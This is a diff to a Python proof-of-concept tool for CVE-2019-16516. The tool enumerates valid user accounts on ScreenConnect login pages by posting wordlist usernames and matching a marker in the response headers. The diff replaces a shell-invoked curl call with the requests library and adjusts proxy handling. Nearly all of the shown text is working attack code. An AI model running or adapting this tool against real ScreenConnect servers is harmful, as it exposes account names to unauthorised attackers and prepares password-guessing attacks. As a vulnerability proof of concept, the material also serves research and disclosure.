@@ -2,10 +2,9 @@
 #
 # ScreenConnect user enumeration tool
 #
-# works on verions: 6.4.15787.6556-1472470634
-#                   6.3.13446.6374-2666439717
-#                   maybe on other
-# czz78
+# CVE-2019-16516
+#
+# POC by czz78
 #
 from multiprocessing import Process, Queue
 from statistics import mean
@@ -13,7 +12,7 @@ from urllib3 import exceptions as urlexcept
 import argparse
 import math
 import re
-import subprocess #need this ecause with python urllib3, pycurl or requests some header value on responce don't work
+import requests
 
 class bcolors:
     HEADER = '\033[95m'
@@ -52,11 +51,12 @@ def process_enum(queue, found_queue, wordlist, url, payload, failstr, verbose, p
                 if value == '{USER}':
                     user_payload[key] = user
 
-            if proxy != False:
-                proxy = "-x {}".format(proxy)
-            else:
-                proxy = ''
-            x = subprocess.check_output("curl '{}' -H 'Content-Type: application/x-www-form-urlencoded' --data-raw '__EVENTTARGET=&__EVENTARGUMENT=&ctl00%24Main%24userNameBox={}&ctl00%24Main%24passwordBox=a&ctl00%24Main%24ctl05=Login' {} -v ".format(url,user,proxy),stderr=subprocess.STDOUT,shell=True)
+            dataraw = "".join(['%s=%s&' % (key, value) for (key, value) in user_payload.items()])[:-1]
+            headers={"Accept": "*/*" , "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "curl/7.74.0"}
+
+            req = requests.request('POST',url,headers=headers,data=dataraw, proxies=proxies)
+
+            x = "".join('{}: {}'.format(k, v) for k, v in req.headers.items())
 
             if re.search(r"{}".format(failstr), str(x).replace('\n','').replace('\r','')):
                 queue.put((proc_id, "FOUND", user))
@@ -105,7 +105,10 @@ ScreenConnect POC by czz78 :)
     print("Wordlist: "+wordlist)
     if verbose: print("Verbose mode")
     if stop: print("Will stop on first user found")
-    if not proxy: proxy = False
+
+    proxies = {'http': '', 'https': ''}
+    if proxy:
+        proxies = {'http': proxy, 'https': proxy}
 
     print("Initializing processes...")
     # Distribute wordlist to processes
